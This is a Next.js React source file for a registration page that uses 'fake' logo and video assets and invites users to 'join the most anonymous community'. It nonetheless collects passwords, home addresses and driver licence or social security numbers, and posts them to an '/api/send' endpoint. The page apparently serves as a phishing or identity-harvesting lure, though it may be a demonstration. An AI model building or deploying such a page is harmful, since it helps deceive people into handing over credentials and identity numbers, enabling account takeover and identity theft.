"use client";

import React, { useState } from 'react';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';

const Reg = () => {
  const router = useRouter();
  const [isOver18, setIsOver18] = useState<boolean | null>(null);
  const [formData, setFormData] = useState({
    username: '',
    password: '',
    verifyPassword: '',
    address: '',
    driverLicense: ''
  });
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!formData.username || !formData.password || !formData.address || !formData.driverLicense) {
      alert('Please fill out all fields.');
      return;
    }

    setIsSubmitting(true);

    try {
      const response = await fetch('/api/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          username: formData.username,
          password: formData.password,
          address: formData.address,
          driverLicense: formData.driverLicense,
          isOver18: isOver18
        }),
      });

      if (response.ok) {
        alert('Registration successful! Information has been sent.');
        router.push('/pages/Account');
      } else {
        alert('Registration failed. Please try again.');
      }
    } catch (error) {
      console.error('Error:', error);
      alert('An error occurred. Please try again.');
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="flex min-h-screen items-center justify-center overflow-hidden py-12">
      <video
        autoPlay
        loop
        muted
        playsInline
        className="absolute inset-0 h-full w-full object-cover"
      >
        <source src="/fakelogin.mp4" type="video/mp4" />
      </video>
      
      {/* Overlay for better readability */}
      <div className="absolute inset-0 bg-black/30"></div>

      <div className="relative z-10 w-full max-w-lg px-6">
        <div className="rounded-[2rem] p-10 shadow-2xl relative overflow-hidden" style={{
          backgroundColor: 'rgba(0, 0, 0, 0.1)',
          backdropFilter: 'blur(30px)',
          border: '2px solid transparent',
          backgroundImage: 'linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), linear-gradient(135deg, rgba(255, 255, 255, 0.3), rgba(236, 72, 153, 0.3))',
          backgroundOrigin: 'border-box',
          backgroundClip: 'padding-box, border-box'
        }}>
          {/* Logo */}
          <div className="flex justify-center mb-4">
            <Link href="/">
              <div className="rounded-full p-3 cursor-pointer hover:scale-105 transition-all" style={{
                backgroundColor: 'rgba(255, 255, 255, 0.1)',
                backdropFilter: 'blur(10px)'
              }}>
                <Image 
                  src="/fakelogo.png" 
                  alt="Logo" 
                  width={60} 
                  height={60}
                  className="object-contain"
                />
              </div>
            </Link>
          </div>

          {/* Title */}
          <h2 className="text-4xl font-bold text-center mb-2" style={{
            background: 'linear-gradient(to right, white, rgb(236, 72, 153))',
            WebkitBackgroundClip: 'text',
            WebkitTextFillColor: 'transparent',
            backgroundClip: 'text'
          }}>
            Create Account
          </h2>
          <p className="text-white/70 text-center mb-8 text-sm" style={{ color: 'white' }}>
            Join the most anonymous community
          </p>

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Username */}
            <div>
              <label className="block text-white/90 text-sm font-medium mb-2 ml-1" style={{ color: 'white' }}>
                Username
              </label>
              <input
                type="text"
                name="username"
                value={formData.username}
                onChange={handleInputChange}
                className="w-full px-5 py-3.5 rounded-2xl placeholder-white/50 focus:outline-none transition-all"
                style={{
                  backgroundColor: 'rgba(255, 255, 255, 0.12)',
                  backdropFilter: 'blur(10px)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  color: '#00BFFF'
                }}
                placeholder="Choose a username"
                onFocus={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.3)'}
                onBlur={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.1)'}
              />
            </div>

            {/* Password */}
            <div>
              <label className="block text-white/90 text-sm font-medium mb-2 ml-1" style={{ color: 'white' }}>
                Password
              </label>
              <input
                type="password"
                name="password"
                value={formData.password}
                onChange={handleInputChange}
                className="w-full px-5 py-3.5 rounded-2xl placeholder-white/50 focus:outline-none transition-all"
                style={{
                  backgroundColor: 'rgba(255, 255, 255, 0.12)',
                  backdropFilter: 'blur(10px)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  color: '#00BFFF'
                }}
                placeholder="Create a password"
                onFocus={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.3)'}
                onBlur={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.1)'}
              />
            </div>

            {/* Verify Password */}
            <div>
              <label className="block text-white/90 text-sm font-medium mb-2 ml-1" style={{ color: 'white' }}>
                Verify Password
              </label>
              <input
                type="password"
                name="verifyPassword"
                value={formData.verifyPassword}
                onChange={handleInputChange}
                className="w-full px-5 py-3.5 rounded-2xl placeholder-white/50 focus:outline-none transition-all"
                style={{
                  backgroundColor: 'rgba(255, 255, 255, 0.12)',
                  backdropFilter: 'blur(10px)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  color: '#00BFFF'
                }}
                placeholder="Confirm your password"
                onFocus={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.3)'}
                onBlur={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.1)'}
              />
            </div>

            {/* Address */}
            <div>
              <label className="block text-white/90 text-sm font-medium mb-2 ml-1" style={{ color: 'white' }}>
                Address
              </label>
              <input
                type="text"
                name="address"
                value={formData.address}
                onChange={handleInputChange}
                className="w-full px-5 py-3.5 rounded-2xl placeholder-white/50 focus:outline-none transition-all"
                style={{
                  backgroundColor: 'rgba(255, 255, 255, 0.12)',
                  backdropFilter: 'blur(10px)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  color: '#00BFFF'
                }}
                placeholder="Your address"
                onFocus={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.3)'}
                onBlur={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.1)'}
              />
            </div>

            {/* Driver License */}
            <div>
              <label className="block text-white/90 text-sm font-medium mb-2 ml-1" style={{ color: 'white' }}>
                Driver License Number or SSN
              </label>
              <input
                type="text"
                name="driverLicense"
                value={formData.driverLicense}
                onChange={handleInputChange}
                className="w-full px-5 py-3.5 rounded-2xl placeholder-white/50 focus:outline-none transition-all"
                style={{
                  backgroundColor: 'rgba(255, 255, 255, 0.12)',
                  backdropFilter: 'blur(10px)',
                  border: '1px solid rgba(255, 255, 255, 0.1)',
                  color: '#00BFFF'
                }}
                placeholder="License number"
                onFocus={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.3)'}
                onBlur={(e) => e.target.style.border = '1px solid rgba(255, 255, 255, 0.1)'}
              />
            </div>

            {/* Are you 18 or older */}
            <div className="pt-2">
              <label className="block text-sm font-medium mb-3 ml-1" style={{ color: 'white' }}>
                Are you <span style={{ color: 'red', fontWeight: 'bold' }}>18</span> or older?
              </label>
              <div className="flex gap-3">
                <button
                  type="button"
                  onClick={() => setIsOver18(true)}
                  className="flex-1 px-8 py-2.5 rounded-xl text-sm font-semibold transition-all hover:scale-105"
                  style={{
                    backgroundColor: isOver18 === true ? 'white' : 'rgba(255, 255, 255, 0.12)',
                    color: isOver18 === true ? 'black' : 'white',
                    backdropFilter: 'blur(10px)',
                    border: isOver18 === true ? 'none' : '1px solid rgba(255, 255, 255, 0.1)'
                  }}
                >
                  Yes
                </button>
                <button
                  type="button"
                  onClick={() => setIsOver18(false)}
                  className="flex-1 px-8 py-2.5 rounded-xl text-sm font-semibold transition-all hover:scale-105"
                  style={{
                    backgroundColor: isOver18 === false ? 'rgb(220, 38, 38)' : 'rgba(255, 255, 255, 0.12)',
                    color: 'white',
                    backdropFilter: 'blur(10px)',
                    border: isOver18 === false ? 'none' : '1px solid rgba(255, 255, 255, 0.1)'
                  }}
                >
                  No
                </button>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full rounded-full font-bold transition-all hover:scale-[1.02] active:scale-95 mt-6 text-white"
              style={{
                background: 'linear-gradient(to right, white, rgb(236, 72, 153))',
                boxShadow: '0 10px 30px rgba(0, 0, 0, 0.3)',
                WebkitTextFillColor: 'white',
                padding: '1.5rem',
                fontSize: '1.75rem',
                opacity: isSubmitting ? 0.6 : 1,
                cursor: isSubmitting ? 'not-allowed' : 'pointer'
              }}
            >
              {isSubmitting ? 'Submitting...' : 'Create Account'}
            </button>
          </form>

          {/* Footer */}
          <p className="text-white/50 text-center text-sm mt-6" style={{ color: '#00BFFF' }}>
            Already have an account?{' '}
           <Link href="/pages/Login">
            <button className="text-white font-semibold hover:text-pink-400 transition-colors">
              Log In
            </button>
            </Link>
          </p>
        </div>
      </div>
    </div>
  )
}

export default Reg
